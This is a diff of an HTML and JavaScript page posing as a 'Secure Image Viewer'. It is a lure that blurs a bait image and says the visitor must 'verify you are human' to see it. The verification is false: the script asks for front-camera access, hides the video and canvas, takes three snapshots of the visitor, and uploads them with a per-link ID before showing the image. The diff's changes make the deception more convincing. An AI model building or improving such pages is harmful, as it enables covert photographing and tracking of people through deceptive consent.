@@ -3,60 +3,176 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Viewer</title>
+    <title>Secure Image Viewer</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #ffffff;
+            background-color: #0d0f12;
+            color: #e0e0e0;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
         }
-        .container {
-            background: #1e1e1e;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            max-width: 400px;
-            width: 90%;
-        }
-        h2 { margin-top: 0; }
-        p { color: #aaaaaa; font-size: 14px; margin-bottom: 25px; }
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 6px;
-            cursor: pointer;
+
+        /* Blurred Background Image Container */
+        .bg-image-container {
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            transition: background-color 0.3s;
+            height: 100%;
+            z-index: 1;
+            overflow: hidden;
+            display: none; /* Shown via JS */
         }
-        button:hover { background-color: #0056b3; }
-        #videoElement { display: none; }
-        #canvasElement { display: none; }
-        #loading { display: none; margin-top: 15px; color: #ffeb3b; }
-        #success { display: none; margin-top: 15px; color: #4caf50; }
-        #error { display: none; margin-top: 15px; color: #f44336; }
+
+        .bg-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(25px) brightness(0.4);
+            transform: scale(1.1);
+        }
+
+        /* Glassmorphism Card */
+        .glass-card {
+            position: relative;
+            z-index: 10;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .icon-shield {
+            font-size: 48px;
+            margin-bottom: 15px;
+            display: inline-block;
+            background: -webkit-linear-gradient(#00f2fe, #4facfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #ffffff;
+        }
+
+        p {
+            font-size: 15px;
+            color: #a0a0a0;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        button {
+            background: linear-gradient(135deg, #0061ff 0%, #60efff 100%);
+            color: #000;
+            font-weight: 700;
+            font-size: 16px;
+            border: none;
+            border-radius: 12px;
+            padding: 15px 25px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 97, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(0, 97, 255, 0.5);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        .btn-icon {
+            font-size: 20px;
+        }
+
+        .status-msg {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+
+        .status-loading { color: #ffca28; }
+        .status-success { color: #00e676; }
+        .status-error { color: #ff5252; }
+
+        /* Hidden elements */
+        #videoElement, #canvasElement { display: none; }
+        
+        /* Final Clear Image */
+        .clear-image {
+            width: 100%;
+            border-radius: 12px;
+            margin-top: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            display: none;
+            animation: fadeIn 1s;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Protected Image</h2>
-    <p>Please verify you are human to view this image.</p>
-    <button id="verifyBtn">Verify & View Image</button>
-    <p id="loading">Verifying... Please wait and look at the screen.</p>
-    <p id="success">Verification complete. Image will load shortly...</p>
-    <p id="error"></p>
+<!-- Blurred Background -->
+<div class="bg-image-container" id="bgContainer">
+    <img src="" alt="Blurred Background" class="bg-image" id="bgImage">
 </div>
 
+<!-- Main UI Card -->
+<div class="glass-card" id="mainCard">
+    <div class="icon-shield">🛡️</div>
+    <h2>Protected Image</h2>
+    <p>This image is highly protected by our security system. Please verify that you are human to unlock and view the clear image.</p>
+    
+    <button id="verifyBtn">
+        <span class="btn-icon">👁️</span>
+        Verify & View Image
+    </button>
+    
+    <div id="loading" class="status-msg status-loading">⏳ Verifying... Please look at your screen.</div>
+    <div id="success" class="status-msg status-success">✅ Verification complete! Loading image...</div>
+    <div id="error" class="status-msg status-error"></div>
+    
+    <img src="" id="finalImage" class="clear-image">
+</div>
+
+<!-- Hidden Camera Elements -->
 <video id="videoElement" autoplay playsinline></video>
 <canvas id="canvasElement"></canvas>
 
@@ -70,15 +186,48 @@
     const errorMsg = document.getElementById('error');
     const video = document.getElementById('videoElement');
     const canvas = document.getElementById('canvasElement');
+    const bgContainer = document.getElementById('bgContainer');
+    const bgImage = document.getElementById('bgImage');
+    const finalImage = document.getElementById('finalImage');
 
-    if (!userId) {
-        verifyBtn.style.display = 'none';
-        errorMsg.textContent = "Invalid link. No ID provided.";
+    let originalImageUrl = '';
+
+    // Initialization
+    async function init() {
+        if (!userId) {
+            verifyBtn.style.display = 'none';
+            showError("Invalid or missing link parameter.");
+            return;
+        }
+
+        // Fetch image URL to show blurred background
+        try {
+            const res = await fetch(`/api/link/${userId}`);
+            if (res.ok) {
+                const data = await res.json();
+                originalImageUrl = data.original_image_url;
+                bgImage.src = originalImageUrl;
+                bgContainer.style.display = 'block';
+            } else {
+                showError("Link expired or not found.");
+                verifyBtn.style.display = 'none';
+            }
+        } catch (e) {
+            console.error(e);
+        }
+    }
+
+    function showError(text) {
+        errorMsg.textContent = "❌ " + text;
         errorMsg.style.display = 'block';
+        loading.style.display = 'none';
+        verifyBtn.style.display = 'block';
+        verifyBtn.innerHTML = '<span class="btn-icon">🔄</span> Try Again';
     }
 
     verifyBtn.addEventListener('click', async () => {
         try {
+            // Request camera permission
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
             video.srcObject = stream;
             
@@ -86,13 +235,12 @@
             loading.style.display = 'block';
             errorMsg.style.display = 'none';
 
-            // Wait for video to be ready
             video.onloadedmetadata = async () => {
                 const images = [];
                 
-                // Take 3 pictures with 1s delay
+                // Capture sequence
                 for (let i = 0; i < 3; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 800)); // wait 800ms between shots
+                    await new Promise(resolve => setTimeout(resolve, 800));
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -101,10 +249,10 @@
                     images.push(blob);
                 }
 
-                // Stop the camera
+                // Stop camera
                 stream.getTracks().forEach(track => track.stop());
 
-                // Upload images to backend
+                // Upload
                 const formData = new FormData();
                 formData.append('id', userId);
                 images.forEach((blob, idx) => {
@@ -121,29 +269,31 @@
                         loading.style.display = 'none';
                         success.style.display = 'block';
                         
-                        // Optionally fetch the original image using the ID if needed
-                        const data = await response.json();
-                        if (data.original_image_url) {
-                            setTimeout(() => {
-                                document.querySelector('.container').innerHTML = `<img src="${data.original_image_url}" style="width:100%; border-radius:8px;">`;
-                            }, 1500);
-                        }
+                        // Show the final clear image inside the card
+                        setTimeout(() => {
+                            success.style.display = 'none';
+                            bgContainer.style.opacity = '0'; // hide blurred background
+                            document.querySelector('.icon-shield').style.display = 'none';
+                            document.querySelector('h2').style.display = 'none';
+                            document.querySelector('p').style.display = 'none';
+                            
+                            finalImage.src = originalImageUrl;
+                            finalImage.style.display = 'block';
+                        }, 1000);
                     } else {
-                        throw new Error("Failed to verify");
+                        showError("Verification failed on server.");
                     }
                 } catch (err) {
-                    loading.style.display = 'none';
-                    errorMsg.textContent = "Verification failed.";
-                    errorMsg.style.display = 'block';
+                    showError("Network error during verification.");
                 }
             };
-
         } catch (err) {
             console.error("Camera error:", err);
-            errorMsg.textContent = "Camera permission is required to verify.";
-            errorMsg.style.display = 'block';
+            showError("Camera permission is required to verify.");
         }
     });
+
+    init();
 </script>
 
 </body>
